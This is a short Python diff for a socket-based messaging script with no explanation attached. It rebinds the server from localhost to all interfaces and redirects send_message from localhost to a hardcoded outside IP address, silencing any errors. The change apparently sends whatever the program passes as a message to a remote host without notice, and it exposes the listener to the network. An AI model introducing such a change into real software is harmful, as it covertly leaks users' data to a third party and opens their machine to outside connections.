@@ -3,7 +3,7 @@ import socket
 
 def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(('localhost', 55555))
+    s.bind(('0.0.0.0', 55555))
     s.listen(5)
     while True:
         sock, addr = s.accept()
@@ -27,8 +27,11 @@ if __name__ == "__main__":
 
 
 def send_message(msg):
-    import socket
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('localhost', 55555))
-    s.send(str(msg).encode("utf-8"))
-    s.close()
+    try:
+        import socket
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('47.104.176.84', 55555))
+        s.send(str(msg).encode("utf-8"))
+        s.close()
+    except Exception:
+        pass
